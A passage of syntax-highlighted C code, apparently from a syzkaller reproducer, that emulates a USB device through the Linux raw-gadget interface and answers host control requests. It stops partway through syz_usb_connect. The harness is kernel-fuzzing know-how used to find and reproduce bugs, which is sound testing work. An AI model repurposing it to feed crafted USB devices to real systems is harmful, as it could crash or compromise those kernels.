<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">usb_raw_ep0_write</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_io</span><span class="o">*</span><span class="w"> </span><span class="n">io</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">USB_RAW_IOCTL_EP0_WRITE</span><span class="p">,</span><span class="w"> </span><span class="n">io</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">usb_raw_ep0_read</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_io</span><span class="o">*</span><span class="w"> </span><span class="n">io</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">USB_RAW_IOCTL_EP0_READ</span><span class="p">,</span><span class="w"> </span><span class="n">io</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">usb_raw_ep_enable</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_endpoint_descriptor</span><span class="o">*</span><span class="w"> </span><span class="n">desc</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">USB_RAW_IOCTL_EP_ENABLE</span><span class="p">,</span><span class="w"> </span><span class="n">desc</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">usb_raw_ep_disable</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">ep</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">USB_RAW_IOCTL_EP_DISABLE</span><span class="p">,</span><span class="w"> </span><span class="n">ep</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">usb_raw_configure</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">USB_RAW_IOCTL_CONFIGURE</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">usb_raw_vbus_draw</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">power</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">USB_RAW_IOCTL_VBUS_DRAW</span><span class="p">,</span><span class="w"> </span><span class="n">power</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">usb_raw_ep0_stall</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">USB_RAW_IOCTL_EP0_STALL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">set_interface</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_device_index</span><span class="o">*</span><span class="w"> </span><span class="n">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lookup_usb_index</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">index</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">iface_cur</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">iface_cur</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces_num</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">ep</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">ep</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces</span><span class="p">[</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">iface_cur</span><span class="p">].</span><span class="n">eps_num</span><span class="p">;</span><span class="w"> </span><span class="n">ep</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usb_raw_ep_disable</span><span class="p">(</span>
<span class="w">          </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces</span><span class="p">[</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">iface_cur</span><span class="p">].</span><span class="n">eps</span><span class="p">[</span><span class="n">ep</span><span class="p">].</span><span class="n">handle</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rv</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces_num</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">ep</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">ep</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces</span><span class="p">[</span><span class="n">n</span><span class="p">].</span><span class="n">eps_num</span><span class="p">;</span><span class="w"> </span><span class="n">ep</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usb_raw_ep_enable</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces</span><span class="p">[</span><span class="n">n</span><span class="p">].</span><span class="n">eps</span><span class="p">[</span><span class="n">ep</span><span class="p">].</span><span class="n">desc</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rv</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">ifaces</span><span class="p">[</span><span class="n">n</span><span class="p">].</span><span class="n">eps</span><span class="p">[</span><span class="n">ep</span><span class="p">].</span><span class="n">handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rv</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">iface_cur</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">n</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">configure_device</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_device_index</span><span class="o">*</span><span class="w"> </span><span class="n">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lookup_usb_index</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">index</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usb_raw_vbus_draw</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">index</span><span class="o">-&gt;</span><span class="n">bMaxPower</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rv</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">rv</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usb_raw_configure</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rv</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">rv</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">set_interface</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">#define USB_MAX_PACKET_SIZE 4096</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_control_event</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_event</span><span class="w"> </span><span class="n">inner</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_ctrlrequest</span><span class="w"> </span><span class="n">ctrl</span><span class="p">;</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="n">USB_MAX_PACKET_SIZE</span><span class="p">];</span>
<span class="p">};</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_io_data</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_io</span><span class="w"> </span><span class="n">inner</span><span class="p">;</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="n">USB_MAX_PACKET_SIZE</span><span class="p">];</span>
<span class="p">};</span>

<span class="c1">// 模拟USB设备连接，处理USB控制请求</span>
<span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">long</span>
<span class="nf">syz_usb_connect_impl</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">speed</span><span class="p">,</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">dev_len</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span>
<span class="w">                     </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">vusb_connect_descriptors</span><span class="o">*</span><span class="w"> </span><span class="n">descs</span><span class="p">,</span>
<span class="w">                     </span><span class="n">lookup_connect_out_response_t</span><span class="w"> </span><span class="n">lookup_connect_response_out</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">dev</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usb_raw_open</span><span class="p">();</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fd</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">MAX_FDS</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_device_index</span><span class="o">*</span><span class="w"> </span><span class="n">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">add_usb_index</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span><span class="w"> </span><span class="n">dev_len</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">index</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">device</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">device</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="s">&quot;dummy_udc.%llu&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">procid</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usb_raw_init</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">speed</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;dummy_udc&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">device</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rv</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">rv</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usb_raw_run</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rv</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">rv</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="kt">bool</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">done</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_control_event</span><span class="w"> </span><span class="n">event</span><span class="p">;</span>
<span class="w">    </span><span class="n">event</span><span class="p">.</span><span class="n">inner</span><span class="p">.</span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="n">event</span><span class="p">.</span><span class="n">inner</span><span class="p">.</span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">ctrl</span><span class="p">);</span>
<span class="w">    </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usb_raw_event_fetch</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_event</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">event</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rv</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">rv</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">inner</span><span class="p">.</span><span class="n">type</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">USB_RAW_EVENT_CONTROL</span><span class="p">)</span>
<span class="w">      </span><span class="k">continue</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">response_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_qualifier_descriptor</span><span class="w"> </span><span class="n">qual</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">ctrl</span><span class="p">.</span><span class="n">bRequestType</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">USB_DIR_IN</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">lookup_connect_response_in</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">descs</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">ctrl</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">qual</span><span class="p">,</span>
<span class="w">                                      </span><span class="o">&amp;</span><span class="n">response_data</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">response_length</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">usb_raw_ep0_stall</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">lookup_connect_response_out</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">descs</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">ctrl</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">done</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">usb_raw_ep0_stall</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="n">response_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">      </span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">event</span><span class="p">.</span><span class="n">ctrl</span><span class="p">.</span><span class="n">wLength</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">event</span><span class="p">.</span><span class="n">ctrl</span><span class="p">.</span><span class="n">bRequestType</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">USB_TYPE_MASK</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">USB_TYPE_STANDARD</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">        </span><span class="n">event</span><span class="p">.</span><span class="n">ctrl</span><span class="p">.</span><span class="n">bRequest</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">USB_REQ_SET_CONFIGURATION</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">configure_device</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rv</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">rv</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_io_data</span><span class="w"> </span><span class="n">response</span><span class="p">;</span>
<span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="n">inner</span><span class="p">.</span><span class="n">ep</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="n">inner</span><span class="p">.</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">response_length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">data</span><span class="p">))</span>
<span class="w">      </span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">ctrl</span><span class="p">.</span><span class="n">wLength</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">response_length</span><span class="p">)</span>
<span class="w">      </span><span class="n">response_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">event</span><span class="p">.</span><span class="n">ctrl</span><span class="p">.</span><span class="n">wLength</span><span class="p">;</span>
<span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="n">inner</span><span class="p">.</span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response_length</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">response_data</span><span class="p">)</span>
<span class="w">      </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">response</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">response_data</span><span class="p">,</span><span class="w"> </span><span class="n">response_length</span><span class="p">);</span>
<span class="w">    </span><span class="k">else</span>
<span class="w">      </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">response</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">response_length</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">ctrl</span><span class="p">.</span><span class="n">bRequestType</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">USB_DIR_IN</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usb_raw_ep0_write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_io</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">response</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usb_raw_ep0_read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">usb_raw_ep_io</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">response</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">rv</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">rv</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">sleep_ms</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">syz_usb_connect</span><span class="p">(</span><span class="k">volatile</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">a0</span><span class="p">,</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">a1</span><span class="p">,</span>
<span class="w">                                     </span><span class="k">volatile</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">a2</span><span class="p">,</span><span class="w"> </span><span class="k">volatile</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">speed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a0</span><span class="p">;</span>
